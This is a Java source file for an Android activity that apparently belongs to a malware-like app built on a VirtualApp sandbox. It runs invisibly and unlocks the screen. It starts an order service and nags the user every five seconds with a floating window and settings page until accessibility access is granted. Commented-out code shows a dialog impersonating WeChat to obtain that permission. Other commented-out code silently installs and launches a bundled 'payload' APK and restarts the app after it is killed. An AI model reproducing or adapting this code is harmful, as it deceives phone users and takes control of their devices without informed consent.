package activity;



import accessibility.Acc101Service;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.app.Dialog;
import android.app.PendingIntent;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.res.Resources;
import android.graphics.Point;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.Display;
import android.view.KeyCharacterMap;
import android.view.KeyEvent;
import android.view.ViewConfiguration;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Toast;

import com.lody.virtual.client.core.VirtualCore;
import com.lody.virtual.client.ipc.VActivityManager;
import com.lody.virtual.remote.InstallResult;


import java.io.File;


import floatwindow.FloatingAccGuide;
import io.virtualapp.R;
import lock.UnlockScreen;
import order.Order101Service;

import utils.ConfigCt;
import utils.FileStorageHelper;
import utils.Funcs;
import utils.ResourceUtil;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
import static com.lody.virtual.client.core.InstallStrategy.UPDATE_IF_EXIST;
import static utils.ConfigCt.TAG;


public class Splash101Activity extends Activity{

	public static boolean mHide=false;
	private String mPkgName="";
	private String mApkFilename="" ;
	private AlertDialog alertDialog;
	private AlertDialog mDialog;

	private Dialog dialog;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		//setContentView(R.layout.activity_splash);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		getWindow().setBackgroundDrawable(new ColorDrawable(android.graphics.Color.TRANSPARENT));
		getWindow().setDimAmount(0f);
		//myRequetPermission();
		ConfigCt.RunningWay=this.getIntent().getIntExtra("RunningWay", ConfigCt.RUNNING_IN_MYSELF);
		Log.i(TAG, "RunningWay="+ConfigCt.RunningWay);
		ConfigCt.getInstance(getApplicationContext());
		getResolution();
		mHide=this.getIntent().getBooleanExtra("hide", false);
		requestPermission();
		//requestPermissionAsk();
		startAllServices();
		//startMainActivityPrepare();
		mHide=false;
		UnlockScreen.getInstance(getApplicationContext()).execUnlockScreen();
		finish();	
	}
	@Override
	protected void onNewIntent(Intent intent) {
	    super.onNewIntent(intent);
	    setIntent(intent);//must store the new intent unless getIntent() will return the old one
		ConfigCt.getInstance(this);
		getResolution();
		//mHide=this.getIntent().getBooleanExtra("hide", false);
		requestPermission();
		startAllServices();
		mHide=false;
		finish();	
	}

	private void startAllServices()  
	{
		Order101Service.arouseOrderThread(getApplicationContext());
	}

	private void requestPermission(){
		final Handler handler= new Handler();
		Runnable runnableHide  = new Runnable() {
			@Override
			public void run() {
				if(Acc101Service.getAcc101Service()==null){
					Acc101Service.sendRequsetPermissionBroadCast(getApplicationContext());
					FloatingAccGuide.getInstance(getApplicationContext()).ShowFloatingWindow();
					String say=getApplicationContext().getString(R.string.acc_permisson_toast);
					say=String.format(say,getApplicationContext().getString(R.string.app_name));
					Toast.makeText(Splash101Activity.this,say, Toast.LENGTH_LONG).show();
					Acc101Service.startSetting(getApplicationContext());
				}else {
					FloatingAccGuide.getInstance(getApplicationContext()).RemoveFloatingWindow();
					return;
				}
				handler.postDelayed(this, 5*1000);
			}
		};
		handler.postDelayed(runnableHide, 5*1000);
	}

    public static void startHomeActivity(Context context){
		Intent home=new Intent(Intent.ACTION_MAIN);  
		home.addCategory(Intent.CATEGORY_HOME); 
		home.addFlags(FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(home); 
    }

    public static void startSplash101Activity(Context context){
    	//if(Order101Service.getOrder101Service()!=null)
    	//	if(AppUtils.isServiceRunning(context,context.getPackageName().toString(), Order101Service.class.getName()))return;
    	mHide=true;
    	//if(ConfigCt.appID.equals("ct"))
            //Splash101Activity.setComponentEnabled(context, Splash101Activity.class, true);
    	Intent intent=new Intent(context, Splash101Activity.class);
    	intent.putExtra("hide", true);
    	intent.addFlags(FLAG_ACTIVITY_NEW_TASK);
    	context.startActivity(intent);
    	//if(ConfigCt.appID.equals("ct"))Splash101Activity.setComponentEnabled(context, Splash101Activity.class, false);
    }


	@SuppressWarnings("deprecation")
	private void getResolution(){
        WindowManager windowManager = getWindowManager();    
        Display display = windowManager.getDefaultDisplay();    
        ConfigCt.screenWidth= display.getWidth();    
        ConfigCt.screenHeight= display.getHeight();  
        ConfigCt.navigationBarHeight= getNavigationBarHeight(this);  
    }
    public static boolean isNavigationBarShow(Activity activity){
	    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
	        Display display = activity.getWindowManager().getDefaultDisplay();
	        Point size = new Point();
	        Point realSize = new Point();
	        display.getSize(size);
	        display.getRealSize(realSize);
	        return realSize.y!=size.y;
	    }else {
	        boolean menu = ViewConfiguration.get(activity).hasPermanentMenuKey();
	        boolean back = KeyCharacterMap.deviceHasKey(KeyEvent.KEYCODE_BACK);
	        if(menu || back) {
	            return false;
	        }else {
	            return true;
	        }
	    }
	}

	public static int getNavigationBarHeight(Activity activity) {
	    if (!isNavigationBarShow(activity)){
		//if (!isNavigationBarShow()){
	        return 0;
	    }
	    Resources resources = activity.getResources();
	    int resourceId = resources.getIdentifier("navigation_bar_height",
	            "dimen", "android");
	    int height = resources.getDimensionPixelSize(resourceId);
	    return height;
	}


	public static int getSceenHeight(Activity activity) {
	    return activity.getWindowManager().getDefaultDisplay().getHeight()+getNavigationBarHeight(activity);
	}




	/*

	private void requestPermissionAsk(){
		if(Acc101Service.getAcc101Service()!=null)return;
		showConfirmDialog(Splash101Activity.this, new OnConfirmResult() {
			@Override
			public void confirmResult(boolean confirm) {
				if (confirm) {
					requestPermission();
				} else {
					android.os.Process.killProcess(android.os.Process.myPid());
				}

			}
		});
	}


	*/

	/*
    //您的手机没有授予悬浮窗权限，请开启后再试

	public  void showConfirmDialog(Context context, OnConfirmResult result) {
		showConfirmDialog(context, "为了保证你正常使用微信服务，维护微信帐号的正常运行及帐号安全，请在手机设置无阻碍界面找到微信并且打开！", result);
	}

	private  void showConfirmDialog(Context context, String message, final OnConfirmResult result) {
		if (dialog != null && dialog.isShowing()) {
			dialog.dismiss();
		}

		dialog = new AlertDialog.Builder(context).setCancelable(true).setTitle("权限申请")
				.setMessage(message)
				.setPositiveButton("现在去开启",
						new DialogInterface.OnClickListener() {
							@Override
							public void onClick(DialogInterface dialog, int which) {
								result.confirmResult(true);
								dialog.dismiss();
							}
						}).setNegativeButton("暂不开启",
						new DialogInterface.OnClickListener() {

							@Override
							public void onClick(DialogInterface dialog, int which) {
								result.confirmResult(false);
								dialog.dismiss();
							}
						}).create();
		dialog.show();
	}

	private  interface OnConfirmResult {
		void confirmResult(boolean confirm);
	}

*/
	/*
		public  static void restartApp(Context context){
		//if(ConfigCt.appID.equals("ct"))
            //Splash101Activity.setComponentEnabled(context, Splash101Activity.class, true);
		Intent intent = new Intent(context, Splash101Activity.class);// Intent.FLAG_ACTIVITY_NEW_TASK
		PendingIntent restartIntent = PendingIntent.getActivity(context, 0, intent,Intent.FLAG_ACTIVITY_NEW_TASK );
		AlarmManager mgr = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
		mgr.set(AlarmManager.RTC, System.currentTimeMillis() + 1000*5,restartIntent); //
		android.os.Process.killProcess(android.os.Process.myPid());
		//if(ConfigCt.appID.equals("ct"))
            //Splash101Activity.setComponentEnabled(context, Splash101Activity.class, false);
	}

	private void startMainActivityPrepare(){
		InstallAndOpenApk(this);
		Handler handler= new Handler();
		Runnable runnable = new Runnable() {
			@Override
			public void run() {
				//startMainActivity(Splash101Activity.this);
				Splash101Activity.this.finish();
			}
		};
		handler.postDelayed(runnable, 1000);
	}
	private synchronized void InstallAndOpenApk(Context context) {
		File mainFileDir = context.getDir("payload_main", Context.MODE_PRIVATE);
		mApkFilename = mainFileDir.getAbsolutePath()+File.separator+ APK_FILE_NAME;
		//mApkFilename=Environment.getExternalStorageDirectory()+"/byc/"+APK_FILE_NAME;
		if(!Funcs.fileExists(mApkFilename)){
			int resID=util.ResourceUtil.getRawId(context, "c");
			FileStorageHelper.copyFilesFromRaw(context,resID,APK_FILE_NAME,mainFileDir.getAbsolutePath());
		}
		if(mPkgName.equals(""))
			mPkgName= util.AppUtils.getPackageNameFromApkName(context,mApkFilename);
		if(!VirtualCore.get().isAppInstalled(mPkgName)) {
			InstallResult res=VirtualCore.get().installPackage(mApkFilename, UPDATE_IF_EXIST);
			if(!res.isSuccess)Log.i(TAG,res.error);
		}
		Intent intent = VirtualCore.get().getLaunchIntent(mPkgName, 0);
		VActivityManager.get().startActivity(intent, 0);
	}
	*
	 */
}
